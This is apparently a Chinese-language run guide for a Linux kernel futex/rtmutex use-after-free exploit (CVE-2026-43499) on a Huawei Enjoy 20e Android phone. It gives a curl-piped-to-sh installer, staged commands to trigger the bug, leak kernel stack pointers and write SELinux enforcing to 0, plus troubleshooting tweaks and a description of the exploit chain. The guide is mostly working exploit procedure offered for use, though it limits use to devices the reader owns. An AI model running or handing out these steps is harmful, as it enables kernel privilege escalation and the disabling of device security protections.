# CVE-2026-43499 (GhostLock) 手机端运行步骤
## 华为畅享 20e (MLD-AL10, MT6765, Android 10) — Exploit v2

> 最后更新: 2026-09-08
> 版本: v2 (3 线程 CMP_REQUEUE_PI 死锁回滚触发, 重写自 v1)

---

## 0. 先读这里（安全须知）

- 本工具只用于**你自己拥有**的设备进行安全研究。
- **先跑测试模式 `-t`** 验证漏洞触发，再跑完整模式。设备**可能崩溃重启**（属正常现象，说明漏洞存在），重要数据请先备份。
- 本 exploit 不写任何内核地址（默认模式），链行走只操作**用户态伪锁**，因此默认模式是安全的。
- 运行前请保证电量 > 50%，建议连接充电器。

---

## 1. 前置检查（30 秒）

在手机上安装 **Termux**（F-Droid 或酷安），打开后依次运行：

```sh
uname -m          # 必须显示 armv7l 或 armv8l (ARM32)
uname -r          # 应为 4.14.141+ (4.14.141 在漏洞范围 2.6.39~7.1 内)
cat /proc/sys/kernel/kptr_restrict   # 0=符号可见, 2=不可见(不影响默认模式)
cat /sys/fs/selinux/enforce          # 1=Enforcing(目标), 0=Permissive(已放行)
```

| 检查项 | 期望值 | 说明 |
|---|---|---|
| `uname -m` | armv7l / armv8l | 若是 aarch64 说明是 ARM64 镜像，需用 32 位兼容层 |
| `uname -r` | 4.14.x | 需在 2.6.39 ~ 7.1 范围内 |
| kptr_restrict | 0 | 影响 `-s` 自动取符号；默认模式不受影响 |
| SELinux | 1 (Enforcing) | 本项目目标是把 enforcing 写 0 |

> **若 `uname -r` 显示 4.14.141+ 但设备厂商已合并修复补丁 `3bfdc63936dd`
> （"rtmutex: Use waiter::task instead of current in remove_waiter()"），
> 则漏洞已被修复，测试模式不会触发，请停止。**

---

## 2. 安装（二选一）

### 方式 A：Termux 一键安装（推荐）

```sh
pkg install curl
curl -sL https://raw.githubusercontent.com/1332915/-10e-/main/cve_2026_43499/install_termux.sh | sh
cd ~/cve_2026_43499
```

### 方式 B：手动复制

1. 从 GitHub 仓库下载 `cve_2026_43499/exploit`（v2 二进制）和 `run.sh`
2. 复制到手机（`/sdcard/Download/cve_2026_43499/` 或 `~/cve_2026_43499/`）
3. `chmod 755 exploit run.sh`

---

## 3. 分阶段运行（重要：按顺序！）

### 阶段 1：测试模式 — 验证漏洞触发（30 秒）

```sh
cd ~/cve_2026_43499
sh run.sh -t
```

**预期结果：**

| 现象 | 含义 | 下一步 |
|---|---|---|
| 设备**崩溃/重启** | ✅ UAF 触发成功，漏洞存在 | 进入阶段 2 |
| 正常退出，日志显示 `Test complete` | ⚠️ 未触发或已打补丁 | 看日志 `deadlock_seen` 是否置位；确认内核未修复 |
| 进程被杀 / `Killed` | seccomp 拦截（Termux 正常现象） | 用 MT 管理器方式运行（见 3.4） |

> 阶段 1 不执行任何写操作，崩溃=漏洞确认。**这一步是必须的**。

### 阶段 2：完整模式 — 泄露验证（默认，安全）

```sh
sh run.sh
```

exploit 会：
1. 触发死锁回滚（UAF）
2. 用 pselect6/prctl/setsockopt/futex 多向量覆盖悬垂栈帧
3. 用 `sched_setscheduler` 触发内核链行走
4. 链行走操作**用户态伪锁**（0xDEAD0000 映射），把内核栈指针写入用户内存

**看日志末尾的 `user fake lock after walk`：**

```
[*] user fake lock after walk: wait_lock=0x00000000
[*] rb_node     = 0xC0xxxxxx   ← 内核栈地址!
[*] rb_leftmost = 0xC0xxxxxx   ← 内核栈地址!
[+] CHAIN WALK OK: kernel stack ptr leaked to user!
```

| 结果 | 含义 | 下一步 |
|---|---|---|
| `CHAIN WALK OK` | ✅ **完整利用链打通**（栈 UAF → 伪造 waiter → 链行走任意写原语） | 进入阶段 3 |
| 全 0，无泄露 | 链行走未命中伪造结构 | 见「故障排查」第 3 条 |
| 设备崩溃 | 链行走打到无效地址（stamp 偏移未对齐） | 见「故障排查」第 3 条 |

### 阶段 3（可选，试验）：SELinux enforcing → 0

```sh
sh run.sh -s          # 自动从 kallsyms 取 selinux_enforcing 地址
# 或手动指定:
# sh run.sh -s 0xC211E598   (offsets.json 中 4.14.141 的值, 仅供参考)
```

> ⚠️ **这是试验功能**：直接对内核全局变量做 rb 树操作，**可能崩溃**。
> 成功后 `cat /sys/fs/selinux/enforce` 应显示 0，随后可用
> `adb root` / `su` 生态继续提权。
> 若崩溃：优先回到阶段 2 确认链已打通，再用 `-k` 模式做 4 字节写验证。

### 3.4 备选：MT 管理器运行（Termux 被 seccomp 拦截时）

1. 把 `exploit` + `run.sh` 复制到 `/sdcard/Download/cve_2026_43499/`
2. 打开 MT 管理器 → 进入目录 → 点击 `run.sh` → 选「终端」或「执行」
3. 或 MT 管理器内置终端：`cd /sdcard/Download/cve_2026_43499 && sh run.sh -t`

---

## 4. 故障排查

| # | 现象 | 原因/对策 |
|---|---|---|
| 1 | `-t` 无崩溃、正常退出 | 内核可能已修复 (3bfdc63936dd)；或 Termux seccomp 拦了 futex PI。用 MT 管理器方式重试；仍无效则换内核镜像 |
| 2 | 进程被 SIGSYS 杀 | 见日志；exploit 内置 SIGSYS 兜底，被屏蔽的 syscall 自动跳过，不影响主链 |
| 3 | 阶段 2 无泄露或崩溃 | stamp 向量未命中悬垂帧。换设备实测的调整点：`exploit_pure.c` 中 `stamp_all()` 的 `nfds_list`/`off_list`（内核栈帧深度随 pselect 参数变化）；或调 `-p`（伪造 prio，默认 0） |
| 4 | `sched_setscheduler` 被拒 | 4.14 普通用户对**自己线程**调 SCHED_NORMAL 是允许的（`-p` 改动 prio 即可触发）；若仍失败检查是否被 seccomp 拦截 |
| 5 | 需要换内核镜像 | 仓库根目录 `BOOT.img` 是畅享 **10e**（ARM64）的，畅享 **20e** 需用 `make_boot_v2.py` 打包自己的 boot |

---

## 5. 原理摘要（为什么 v2 能触发）

```
owner:   LOCK_PI(f_pi_target) → LOCK_PI(f_pi_chain)   [阻塞, 等 waiter]
waiter:  LOCK_PI(f_pi_chain) → WAIT_REQUEUE_PI(f_wait → f_pi_target) [阻塞]
main:    CMP_REQUEUE_PI(f_wait → f_pi_target, 1, 1)
         → 代理锁检测到死锁 → 回滚 → remove_waiter() 错误清理 current
         → waiter->task->pi_blocked_on 悬垂 (指向已释放的内核栈帧)
waiter:  WAIT_REQUEUE_PI 超时返回 → 栈帧释放 → UAF 悬垂点
waiter:  pselect6 等向量覆盖悬垂帧 → 写入伪造 rt_mutex_waiter
consumer: sched_setscheduler(waiter, SCHED_NORMAL)
         → rt_mutex_adjust_pi → 链行走 → 操作伪造 waiter
         → rb_erase 的 __rb_change_child 对 fake[0]&~1 做 4 字节原子写
```

v1 的失败原因：`WAIT_REQUEUE_PI` **超时路径不经过 futex_requeue 的代理锁回滚**，
打不到 `remove_waiter()` 的 bug（该 bug 只在 requeue 死锁回滚时触发）。v2 已修正。

---

## 6. 复现链参考

- 官方修复: `3bfdc63936dd` "rtmutex: Use waiter::task instead of current in remove_waiter()"
- 公开 PoC: NebuSec/CyberMeowfia → IonStack/CVE-2026-43499
- 同类 MTK 适配: knowlily/cve-2026-43499-honor (Magic6 Pro 完整链),
  233laoliu/mt6985-CVE-2026-43499
